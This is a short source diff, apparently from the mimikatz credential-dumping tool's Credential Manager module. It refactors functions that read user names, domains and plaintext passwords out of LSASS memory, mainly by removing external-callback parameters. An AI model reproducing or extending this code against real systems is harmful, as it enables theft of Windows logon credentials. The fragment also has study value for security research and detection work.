@@ -10,7 +10,7 @@ const PKUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_credman_single_package[] = {&kuhl
 
 NTSTATUS kuhl_m_sekurlsa_credman(int argc, wchar_t * argv[])
 {
-	return kuhl_m_sekurlsa_getLogonData(kuhl_m_sekurlsa_credman_single_package, 1, NULL, NULL);
+	return kuhl_m_sekurlsa_getLogonData(kuhl_m_sekurlsa_credman_single_package, 1);
 }
 
 const CREDMAN_INFOS credhelper[] = {
@@ -40,7 +40,7 @@ const CREDMAN_INFOS credhelper[] = {
 	},
 };
 
-void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_credman(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL PKUHL_M_SEKURLSA_EXTERNAL externalCallback, IN OPTIONAL LPVOID externalCallbackData)
+void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_credman(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData)
 {
 	KIWI_CREDMAN_SET_LIST_ENTRY setList;
 	KIWI_CREDMAN_LIST_STARTER listStarter;
@@ -82,7 +82,7 @@ void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_credman(IN PKIWI_BASIC_SECURIT
 									kiwiCreds.Domaine = *(PUNICODE_STRING) ((PBYTE) aLocalMemory.address + credhelper[CredOffsetIndex].offsetDomain);
 									kiwiCreds.Password.Length = kiwiCreds.Password.MaximumLength = *(PUSHORT) ((PBYTE) aLocalMemory.address + credhelper[CredOffsetIndex].offsetCbPassword);;
 									kiwiCreds.Password.Buffer = *(PWSTR *) ((PBYTE) aLocalMemory.address + credhelper[CredOffsetIndex].offsetPassword);
-									kuhl_m_sekurlsa_genericCredsOutput(&kiwiCreds, pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_CREDMANPASS, externalCallback, externalCallbackData);
+									kuhl_m_sekurlsa_genericCredsOutput(&kiwiCreds, pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_CREDMANPASS);
 									aLsassMemory.address = *(PVOID *) ((PBYTE) aLocalMemory.address + credhelper[CredOffsetIndex].offsetFLink);
 								}
 								else break;
